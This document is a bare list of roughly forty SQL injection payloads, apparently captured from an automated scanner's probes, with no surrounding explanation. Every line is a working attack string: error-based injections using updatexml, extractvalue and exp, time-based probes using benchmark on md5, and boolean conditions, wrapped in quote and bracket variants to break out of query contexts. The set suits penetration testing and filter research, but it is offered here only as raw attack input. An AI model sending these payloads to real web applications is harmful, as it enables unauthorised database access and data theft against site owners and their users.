+1   )    )    and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (   5524  =  5524
+1 where 9083  =  9083 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #
+1' or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and 'kjfm'  =  'kjfm
+1'||  (  select 'xuou' from dual where 7681  =  7681 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )     )  ||'
+1%'  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  '%'  =  '
+1  )   as hlit where 4973  =  4973 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #
+1'  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  
+1  )   where 9338  =  9338 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   --
+1  )   procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #
+1"  )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and   (  "smhd" like "smhd
+1  )   procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #
+1' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  
+1%'   )    )     )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (     (  '%'  =  '
+1'+  (  select jidy where 2989  =  2989 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #
+1'||  (  select 'vsfg' where 3547  =  3547 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161   )    )   ||'
+1' and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and 'lgat' like 'lgat
+1" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and "ekjs" like "ekjs
+1" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and "ekjs" like "ekjs
+1 where 5266  =  5266 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --
+1" and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and "ygzq" like "ygzq
+1%'  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  '%'  =  '
+1'   )    )     )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (     (  'eugs'  =  'eugs
+1" or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and "deeu" like "deeu
+1'  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  'ngxz'  =  'ngxz
+1'  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and   (  'tetk'  =  'tetk
+1',  (  select   (  case when   (  6560  =  2813  )   then 1 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual  )  
+1' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and 'kird'  =  'kird
+1'   )    )     )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  'cfhi' like 'cfhi
+1' in boolean mode  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   #
+1'   )    )    or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (   'skdm'  =  'skdm
+1%"   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  "%"  =  "
+1"   )    )    or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (   "ghdr" like "ghdr
+1   )    )    as pjjz where 8384  =  8384 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   --
+1%"  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  "%"  =  "
+1" where 3221  =  3221 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  --
+1'   )    )     )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (     (  'yznn' like 'yznn
+1 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  # dyed
+  (  updatexml  (  8862,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  8862  =  8862,1   )    )     )  ,0x717a767a71  )  ,8981   )    )   
+1%'   )    )     )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  '%'  =  '
